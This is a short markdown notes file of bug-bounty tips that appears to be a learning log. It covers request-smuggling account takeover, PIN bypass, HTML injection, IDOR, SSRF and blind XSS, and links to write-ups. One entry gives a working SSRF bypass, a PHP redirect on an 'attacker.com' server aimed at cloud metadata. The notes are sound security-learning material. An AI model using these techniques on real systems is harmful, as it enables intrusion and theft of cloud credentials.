## 100 Day Learning Challange

### Accont Takeover Via Request Smuggling

If you Found an `HTTP request Smuggling Bug` You can chain it with an  `Open Redirect` to Perform the `Accoun Takeover`

__Refrence__:

[https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)

---

### Bypassing PIN Varification VIA removing a file

If Pin is saved in file.txt sometimes removing file.txt will bypass the pin verfication

__Refrence__

[https://medium.com/sourav-sahana/bypass-mobile-pin-verification-d2c571afa3aa](https://medium.com/sourav-sahana/bypass-mobile-pin-verification-d2c571afa3aa)

---

### HTML Injection VIA  Email

Sometimes if any user input data is send to email ! Try it for HTML injection.

---


### IDOR Tip

Always try to Bruteforce all HTTP methods on API Endpoints It can lead to some devastating results.

---

#### External SSRF Bypass with Open Redirection

The External SSRF can be easily used to get cloud Metadata through Redirection Technique

Example:

if `Target.com/vul.php?url=amazon.com/matadata` is blocked

make an `redirect.php` on you server
```php
<?php
header("Location: amazon.com/matadata");
?>
```

then try `Target.com/vul.php?url=attacker.com/redirect.php` 

__Refrence__

[https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437](https://medium.com/@dPhoeniixx/vimeo-upload-function-ssrf-7466d8630437)

---

### SSRF via Video Files

If you ever came across a webapp which allows your to edit videos anyhow on server side. You can try to do ssrf.

__Refrence__
[https://medium.com/@pflash0x0punk/ssrf-via-ffmpeg-hls-processing-a04e0288a8c5](https://medium.com/@pflash0x0punk/ssrf-via-ffmpeg-hls-processing-a04e0288a8c5)


---

### Sometimes Blind XSS doesn't allows external JS scripts to be called 

[https://medium.com/@dirtycoder0124/blind-xss-a-mind-game-to-win-the-battle-4fc67c524678?](https://medium.com/@dirtycoder0124/blind-xss-a-mind-game-to-win-the-battle-4fc67c524678?)
